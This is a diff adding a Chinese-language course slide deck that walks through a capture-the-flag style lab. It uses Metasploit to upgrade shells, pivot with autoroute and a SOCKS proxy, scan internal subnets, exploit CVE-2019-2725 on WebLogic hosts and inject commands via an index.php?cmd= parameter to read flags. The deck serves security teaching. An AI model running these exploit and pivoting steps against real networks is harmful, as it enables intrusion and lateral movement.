+# 也可以直接 sessions -u 1
+search meterpreter type:post
+use post/multi/manage/shell_to_meterpreter
+show options
+set lhost 192.168.56.214
+set session 1
+
+run -j
+
+sessions -l
+# Active sessions
+# ===============
+# 
+#   Id  Name  Type                   Information          Connection
+#   --  ----  ----                   -----------          ----------
+#   1         shell cmd/unix                              192.168.56.214:4444 -&gt; 192.168.56.216:60690  (192.168.56.216)
+#   2         meterpreter x86/linux  root @ 192.170.84.5  192.168.56.214:4433 -&gt; 192.168.56.216:39756  (192.168.56.216)
+
+# 进入 meterpreter 会话 2
+sessions -i 2
+
+# setup pivot: run autoroute
+# 查看网卡列表
+ipconfig
+# Interface  1
+# ============
+# Name         : lo
+# Hardware MAC : 00:00:00:00:00:00
+# MTU          : 65536
+# Flags        : UP,LOOPBACK
+# IPv4 Address : 127.0.0.1
+# IPv4 Netmask : 255.0.0.0
+# 
+# 
+# Interface 23
+# ============
+# Name         : eth0
+# Hardware MAC : 02:42:c0:aa:54:05
+# MTU          : 1500
+# Flags        : UP,BROADCAST,MULTICAST
+# IPv4 Address : 192.170.84.5
+# IPv4 Netmask : 255.255.255.0
+# 查看路由表
+route
+# IPv4 network routes
+# ===================
+# 
+#     Subnet        Netmask        Gateway       Metric  Interface
+#     ------        -------        -------       ------  ---------
+#     0.0.0.0       0.0.0.0        192.170.84.1  0       eth0
+#     192.170.84.0  255.255.255.0  0.0.0.0       0       eth0
+
+# 查看 ARP 表
+arp
+# ARP cache
+# =========
+# 
+#     IP address    MAC address        Interface
+#     ----------    -----------        ---------
+#     192.170.84.1  02:42:f9:ce:65:00
+
+run autoroute -s 192.170.84.0/24
+
+# 检查 Pivot 路由是否已创建成功
+run autoroute -p
+# Active Routing Table
+# ====================
+# 
+#    Subnet             Netmask            Gateway
+#    ------             -------            -------
+#    192.170.84.0       255.255.255.0      Session 2
+
+# portscan through pivot
+search portscan
+use auxiliary/scanner/portscan/tcp
+show options
+# 根据子网掩码推导
+set RHOSTS 192.170.84.2-254
+# 根据「经验」
+set rport 7001
+# 根据「经验」
+set threads 10
+# 开始扫描
+run -j
+
+# 等到扫描结果 100%
+# 查看主机存活情况
+hosts
+
+# 查看发现的服务列表
+services
+# Services
+# ========
+# 
+# host            port   proto  name           state   info
+# ----            ----   -----  ----           -----   ----
+# 192.168.56.216  29551  tcp    http           open    Jetty 9.4.31.v20200723
+# 192.170.84.2    7001   tcp                   open
+# 192.170.84.3    7001   tcp                   open
+# 192.170.84.4    7001   tcp                   open
+# 192.170.84.5    7001   tcp                   open
+
+# setup socks5 proxy 
+search socks_proxy
+use auxiliary/server/socks_proxy
+run -j
+# 查看后台任务
+jobs -l
+# Jobs
+# ====
+# 
+#   Id  Name                           Payload  Payload opts
+#   --  ----                           -------  ------------
+#   4   Auxiliary: server/socks_proxy
+
+# 新开一个 ssh 会话窗口
+# 检查 1080 端口服务开放情况
+sudo lsof -i tcp:1080 -l -n -P
+# COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+# ruby    299727     1000   10u  IPv4 910459      0t0  TCP *:1080 (LISTEN)
+
+# 编辑 /etc/proxychains4.conf
+sudo sed -i.bak -r &quot;s/socks4\s+127.0.0.1\s+9050/socks5 127.0.0.1 1080/g&quot; /etc/proxychains4.conf
+
+proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.170.84.2-5
+
+# 回到 metasploit 会话窗口
+# 重新进入 shell 会话
+sessions -i 1
+curl http://192.170.84.2:7001 -vv
+curl http://192.170.84.3:7001 -vv
+curl http://192.170.84.4:7001 -vv</code></pre>
+</section>
+<section id="攻破靶标2-4" class="slide level2">
+<h2>攻破靶标2-4</h2>
+<pre class="bash"><code># search exploit
+search cve-2019-2725
+
+# getshell
+use 0
+show options
+set RHOSTS 192.170.84.2
+# 分别设置不同的靶机 IP 
+set lhost 192.168.56.214
+# 分别 run
+run -j
+
+# get flag2-4
+sessions -c &quot;ls /tmp&quot; -i 3,4,5</code></pre>
+</section>
+<section id="发现终点靶标" class="slide level2">
+<h2>发现终点靶标</h2>
+<pre class="bash"><code># 通过网卡、路由、ARP 发现新子网 192.169.85.0/24
+sessions -c &quot;ifconfig&quot; -i 3,4,5
+
+# ...
+# [*] Running &#39;ifconfig&#39; on shell session 5 (192.170.84.3)
+# eth0      Link encap:Ethernet  HWaddr 02:42:c0:aa:54:03
+#           inet addr:192.170.84.3  Bcast:192.170.84.255  Mask:255.255.255.0
+#           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+#           RX packets:828 errors:0 dropped:0 overruns:0 frame:0
+#           TX packets:47 errors:0 dropped:0 overruns:0 carrier:0
+#           collisions:0 txqueuelen:0
+#           RX bytes:38734 (38.7 KB)  TX bytes:4854 (4.8 KB)
+# 
+# eth1      Link encap:Ethernet  HWaddr 02:42:c0:a9:55:03
+#           inet addr:192.169.85.3  Bcast:192.169.85.255  Mask:255.255.255.0
+#           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+#           RX packets:19 errors:0 dropped:0 overruns:0 frame:0
+#           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+#           collisions:0 txqueuelen:0
+#           RX bytes:1342 (1.3 KB)  TX bytes:0 (0.0 B)
+# 
+# lo        Link encap:Local Loopback
+#           inet addr:127.0.0.1  Mask:255.0.0.0
+#           UP LOOPBACK RUNNING  MTU:65536  Metric:1
+#           RX packets:6 errors:0 dropped:0 overruns:0 frame:0
+#           TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
+#           collisions:0 txqueuelen:1000
+#           RX bytes:328 (328.0 B)  TX bytes:328 (328.0 B)
+# ...
+
+# portscan through pivot
+# 将会话 4 升级为 meterpreter shell
+sessions -u 4
+# 新的 meterpreter shell 会话编号此处为 6
+sessions -i 6
+# 将新发现的子网加入 Pivot Route
+run autoroute -s 192.169.85.0/24
+run autoroute -p
+# Active Routing Table
+# ====================
+# 
+#    Subnet             Netmask            Gateway
+#    ------             -------            -------
+#    192.169.85.0       255.255.255.0      Session 7
+#    192.170.84.0       255.255.255.0      Session 2
+# 通过 CTRL-Z 将当前会话放到后台继续执行
+use scanner/portscan/tcp
+set RHOSTS 192.169.85.2-254
+set ports 80
+run 
+# 发现终点靶标 192.169.85.2 80(tcp)</code></pre>
+</section>
+<section id="拿到终点靶标上的-flag" class="slide level2">
+<h2>拿到终点靶标上的 Flag</h2>
+<pre class="bash"><code># 利用跳板机 192.170.84.3 的 shell 会话「踩点」最终靶标
+sessions -c &quot;curl http://192.169.85.2&quot; -i 5
+# 发现没安装 curl ，试试 wget
+sessions -c &quot;wget http://192.169.85.2&quot; -i 5
+# 发现没有命令执行回显，试试组合命令
+sessions -c &quot;wget http://192.169.85.2 -O /tmp/result &amp;&amp; cat /tmp/result&quot; -i 5
+# 发现 get flag 提示
+sessions -c &quot;wget &#39;http://192.169.85.2/index.php?cmd=ls /tmp&#39; -O /tmp/result &amp;&amp; cat /tmp/result&quot; -i 5
+# index.php?cmd=ls /tmpflag-{bmh8f2e8555-eab8-43f9-8654-78c019607788}</code></pre>
+</section>
+<section id="停止抓包开始分析" class="slide level2">
+<h2>停止抓包，开始分析</h2>
+<ul>
+<li>进入 <code>vulfocus</code> 所在虚拟机的 GUI 桌面，使用 <code>Wireshark</code> 打开捕获到的数据包</li>
+<li>通过 <code>scp</code> 将捕获到的数据包拷贝到宿主机上使用 <code>Wireshark</code> 分析</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>试试本课程《第九章 入侵检测》和《第十二章 计算机取证》实验中用到的 <code>Suricata</code> 来分析此次场景的攻击流量包</p>
+</blockquote>
+</section>
+</section>
+<section>
+<section id="总结" class="title-slide slide level1">
+<h1>总结</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>现有的开源技术足以支撑我们在『严格受控条件』下搭建起一个 <strong>高仿真度</strong> 的漏洞攻防网络环境</li>
+<li><strong>⽹络安全攻防实验必须严格限制在局域⽹范围内</strong></li>
+<li><strong>知法守法</strong></li>
+</ul>
+</section>
+</section>
+    </div>
+  </div>
+
+  <script src="lib/reveal.js/lib/js/head.min.js"></script>
+  <script src="lib/reveal.js/js/reveal.js"></script>
+
+  <script>
+
+      // Full list of configuration options available at:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+        // Display the page number of the current slide
+        slideNumber: true,
+        // Push each slide change to the browser history
+        history: true,
+        // Transition style
+        transition: 'fade', // none/fade/slide/convex/concave/zoom
+        math: {
+          mathjax: '',
+          config: 'TeX-AMS_HTML-full',
+          tex2jax: {
+            inlineMath: [['\\(','\\)']],
+            displayMath: [['\\[','\\]']],
+            balanceBraces: true,
+            processEscapes: false,
+            processRefs: true,
+            processEnvironments: true,
+            preview: 'TeX',
+            skipTags: ['script','noscript','style','textarea','pre','code'],
+            ignoreClass: 'tex2jax_ignore',
+            processClass: 'tex2jax_process'
+          },
+        },
+  multiplex: {
+    secret: null, //【TO REPLACE】 null so the clients do not have control of the master presentation
+    id: '', // 【TO REPLACE】socketId, obtained from socket.io server
+    url: ''  //【TO REPLACE】Location of your socket.io server
+  },
+
+menu: {
+		// Specifies which side of the presentation the menu will 
+		// be shown. Use 'left' or 'right'.
+		side: 'left',
+
+		// Specifies the width of the menu.
+		// Can be one of the following:
+		// 'normal', 'wide', 'third', 'half', 'full', or
+		// any valid css length value
+		width: 'normal',
+
+		// Add slide numbers to the titles in the slide list.
+		// Use 'true' or format string (same as reveal.js slide numbers)
+		numbers: true,
+
+		// Specifies which slide elements will be used for generating
+		// the slide titles in the menu. The default selects the first
+		// heading element found in the slide, but you can specify any
+		// valid css selector and the text from the first matching
+		// element will be used.
+		// Note: that a section data-menu-title attribute or an element
+		// with a menu-title class will take precedence over this option
+		titleSelector: 'h1, h2, h3, h4, h5, h6',
+
+		// If slides do not have a matching title, attempt to use the
+		// start of the text content as the title instead
+		useTextContentForMissingTitles: false,
+
+		// Hide slides from the menu that do not have a title.
+		// Set to 'true' to only list slides with titles.
+		hideMissingTitles: false,
+
+		// Adds markers to the slide titles to indicate the 
+		// progress through the presentation. Set to 'false'
+		// to hide the markers.
+		markers: true,
+
+		// Specify custom panels to be included in the menu, by
+		// providing an array of objects with 'title', 'icon'
+		// properties, and either a 'src' or 'content' property.
+		custom: false,
+
+		// Specifies the themes that will be available in the themes
+		// menu panel. Set to 'true' to show the themes menu panel
+		// with the default themes list. Alternatively, provide an
+		// array to specify the themes to make available in the
+		// themes menu panel, for example...
+		// [
+		//     { name: 'Black', theme: 'css/theme/black.css' },
+		//     { name: 'White', theme: 'css/theme/white.css' },
+		//     { name: 'League', theme: 'css/theme/league.css' }
+		// ]
+		themes: false,
+
+		// Specifies the path to the default theme files. If your
+		// presentation uses a different path to the standard reveal
+		// layout then you need to provide this option, but only
+		// when 'themes' is set to 'true'. If you provide your own 
+		// list of themes or 'themes' is set to 'false' the 
+		// 'themesPath' option is ignored.
+		themesPath: 'css/theme/',
+
+		// Specifies if the transitions menu panel will be shown.
+		// Set to 'true' to show the transitions menu panel with
+		// the default transitions list. Alternatively, provide an
+		// array to specify the transitions to make available in
+		// the transitions panel, for example...
+		// ['None', 'Fade', 'Slide']
+		transitions: false,
+
+		// Adds a menu button to the slides to open the menu panel.
+		// Set to 'false' to hide the button.
+		openButton: true,
+
+		// If 'true' allows the slide number in the presentation to
+		// open the menu panel. The reveal.js slideNumber option must 
+		// be displayed for this to take effect
+		openSlideNumber: false,
+
+		// If true allows the user to open and navigate the menu using
+		// the keyboard. Standard keyboard interaction with reveal
+		// will be disabled while the menu is open.
+		keyboard: true,
+
+		// Normally the menu will close on user actions such as
+		// selecting a menu item, or clicking the presentation area.
+		// If 'true', the sticky option will leave the menu open
+		// until it is explicitly closed, that is, using the close
+		// button or pressing the ESC or m key (when the keyboard 
+		// interaction option is enabled).
+		sticky: false,
+
+		// If 'true' standard menu items will be automatically opened
+		// when navigating using the keyboard. Note: this only takes 
+		// effect when both the 'keyboard' and 'sticky' options are enabled.
+		autoOpen: true,
+
+		// If 'true' the menu will not be created until it is explicitly
+		// requested by calling RevealMenu.init(). Note this will delay
+		// the creation of all menu panels, including custom panels, and
+		// the menu button.
+		delayInit: false,
+
+		// If 'true' the menu will be shown when the menu is initialised.
+		openOnInit: false,
+
+		// By default the menu will load it's own font-awesome library
+		// icons. If your presentation needs to load a different
+		// font-awesome library the 'loadIcons' option can be set to false
+		// and the menu will not attempt to load the font-awesome library.
+		loadIcons: true
+	},
+
+
+        // Optional reveal.js plugins
+        dependencies: [
+          { src: 'lib/reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+          { src: 'lib/reveal.js/plugin/zoom-js/zoom.js', async: true },
+          { src: 'lib/reveal.js/plugin/math/math.js', async: true },
+          { src: 'lib/reveal.js/plugin/menu/menu.js'},
+          { src: 'lib/reveal.js/plugin/markdown/marked.js'},
+          { src: 'lib/reveal.js/plugin/markdown/markdown.js'},
+          { src: 'lib/reveal.js/plugin/search/search.js'},
+          { src: 'lib/reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+          { src: 'lib/reveal.js/plugin/notes/notes.js', async: true },
+          { src: 'lib/reveal.js/plugin/socket.io/socket.io.js', async: true },
+          { src: 'lib/reveal.js/plugin/multiplex/master.js', async: true },
+          { src: 'lib/reveal.js/plugin/multiplex/client.js', async: true },
+        ]
+      });
+    </script>
+    </body>
+</html>
